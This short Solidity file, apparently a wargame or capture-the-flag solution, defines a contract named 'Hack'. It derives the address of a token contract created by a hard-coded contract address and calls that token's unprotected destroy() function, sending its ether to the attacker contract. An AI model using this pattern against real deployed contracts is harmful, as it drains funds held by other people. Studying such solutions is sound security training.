// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget1 {
    function generateToken(string memory _name, uint256 _initialSupply) external;
}
interface ITarget2 {
    function name() external view returns (string memory);

    function balances(address account) external view returns (uint256);

    function transfer(address _to, uint256 _amount) external;

    function destroy(address payable _to) external;
}


contract Hack {
    ITarget1 public target1 = ITarget1(0xe61FDeDBcb68e8966c869E51eAb9020cFAAdf066);
    ITarget2 public target2;
    constructor() {

    }

    function hack() public {
        target1.generateToken("ur mama", 1000);
        address addr = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), 0xe61FDeDBcb68e8966c869E51eAb9020cFAAdf066, bytes1(0x01))))));
        target2 = ITarget2(addr);
        target2.destroy(payable(address(this)));

    }

}